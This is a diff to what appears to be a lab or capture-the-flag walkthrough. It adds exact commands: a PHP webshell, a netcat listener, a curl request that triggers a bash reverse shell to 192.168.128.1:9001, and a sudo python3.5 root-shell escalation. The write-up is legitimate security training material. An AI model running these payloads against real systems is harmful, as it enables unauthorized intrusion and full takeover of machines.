@@ -54,8 +54,21 @@ After uploading the file, I used it to trigger command execution on the target s
 
 ![7-command-exec-onfile](screenshots/7-command-exec-onfile.png)
 
-To get an interactive shell, I started a listener on my Kali machine with `nc -lvnp 9001` and then used a `curl` request to call the uploaded file and execute a reverse shell payload.
+To get an interactive shell, I started a listener on my Kali machine with `nc -lvnp 9001` and then used the uploaded PHP webshell to execute a reverse shell payload. Because the file contained `<?php system($_GET['cmd']); ?>`, I could pass arbitrary shell commands through the `cmd` parameter in the URL.
 
+On the attacker machine, the listener was:
+
+```bash
+nc -lvnp 9001
+```
+
+Then I used this `curl` request to URL-encode the command safely and connect back to my Kali machine:
+
+```bash
+curl --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.128.1/9001 0>&1'" "http://192.168.128.3/files/exploit.php"
+```
+
+This caused the target system to open a connection back to `192.168.128.1:9001` and spawn a Bash shell. Once the connection was established, I had a `www-data` shell on the victim machine, as shown below.
 
 ![www-data](screenshots/www-data.png)
 
@@ -83,7 +96,11 @@ After running `sudo -l`, I found that `shrek` was allowed to execute `python3.5`
 
 ![12-sudo-l](screenshots/12-sudo-l.png)
 
-I then used Python to spawn a root shell.
+I then used Python to spawn a root shell:
+
+```bash
+sudo /usr/bin/python3.5 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 ![13-sudo-python](screenshots/13-sudo-python.png)
 
